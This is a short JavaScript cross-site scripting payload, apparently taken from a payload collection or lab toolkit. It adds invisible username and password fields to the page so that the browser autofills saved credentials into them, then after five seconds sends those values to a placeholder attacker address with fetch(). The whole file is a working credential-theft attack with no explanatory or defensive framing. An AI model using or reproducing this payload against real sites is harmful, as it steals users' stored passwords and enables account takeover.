// server
let ip = "<attacker-IP-address>"
let port = "80"

// saved passwords
let body = document.getElementsByTagName("body")[0]

let dataUser = document.createElement("input")
dataUser.type = "text"
dataUser.style.position = "fixed"
dataUser.style.opacity = "0"
 
let dataPass = document.createElement("input")
dataPass.type = "password"
dataPass.style.position = "fixed"
dataPass.style.opacity = "0"

body.append(dataUser)
body.append(dataPass)

setTimeout(function(){ 
	fetch("http://" + ip + ":" + port + "/xss.php?user=" + encodeURIComponent(dataUser.value) + "&pass=" + encodeURIComponent(dataPass.value))
}, 5000)